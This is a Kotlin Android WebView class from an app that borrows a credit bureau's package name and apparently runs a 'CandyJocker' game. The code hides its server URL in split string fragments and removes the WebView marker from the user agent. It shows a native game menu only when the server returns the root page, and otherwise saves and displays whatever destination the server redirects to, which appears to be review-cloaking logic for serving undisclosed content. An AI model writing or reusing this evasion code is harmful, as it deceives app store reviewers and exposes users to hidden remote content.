package br.com.serasaexperian.consumido.ui.custom

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.ActivityResultLauncher
import br.com.serasaexperian.consumido.CandyJockerActivity
import br.com.serasaexperian.consumido.data.CandyJockerStorageImpl
import br.com.serasaexperian.consumido.domain.CandyJockerStorage
import br.com.serasaexperian.consumido.domain.SelectedFile
import javax.inject.Inject

class PolicyView(
    private val context: Context,
    private val selectedFile: SelectedFile,
    private val candyJockerStorage: CandyJockerStorage

) : WebView(context) {

    @SuppressLint("SetJavaScriptEnabled")
    fun startInitPolicy(activityResultLauncher: ActivityResultLauncher<String>){

        with(settings){
            javaScriptEnabled = true
            domStorageEnabled = true
            loadWithOverviewMode = false
            userAgentString = aReplacer(userAgentString) as String
        }

        webViewClient = provide1Client() as WebViewClient
        webChromeClient = provide2Client(activityResultLauncher) as WebChromeClient
    }


    private fun provide1Client(): Any{
        return object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)

                if (url != null){
                    destinationChecker(url)
                }
            }
        }
    }

    private fun provide2Client(activityResultLauncher: ActivityResultLauncher<String>): Any{
        return object : WebChromeClient(){
            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                if (filePathCallback != null) {
                    selectedFile.onSelectImages(filePathCallback)
                    activityResultLauncher.launch(agentList[2])
                }

                return true
            }
        }
    }

    private fun destinationChecker(destination: String){
        Log.d("123123", "url is $destination")

        val original = agentList[3]+agentList[4]+agentList[5]+"z/"
        if (destination == original){
            //India, go to the menu
            goToTheGoa()
        } else {
            destinationKeeper(destination)
        }
    }

    private fun goToTheGoa() {
        //save data to the storage
        candyJockerStorage.savePolicyDestination(CandyJockerStorageImpl.ViUViU)
        val intentToGoa = Intent(context, CandyJockerActivity::class.java)
        context.startActivity(intentToGoa)
    }


    private fun destinationKeeper(destination: String){
        val currentDestination = candyJockerStorage.readPolicyDestination()
        val original = agentList[3]+agentList[4]+agentList[5]

        if (currentDestination.startsWith(original) || currentDestination == CandyJockerStorageImpl.NO_POLICY ){
            //save link
            candyJockerStorage.savePolicyDestination(destination)
        }

    }

    private fun aReplacer(original: String) : Any{
        val elementsToReplace = agentList[0] + agentList[1]
        val empty = " "
        return original.replace(elementsToReplace, empty)
    }

    companion object{
        val agentList = listOf("w", "v", "image/*", "htt", "ps://cand", "yjoker.xy")
    }
}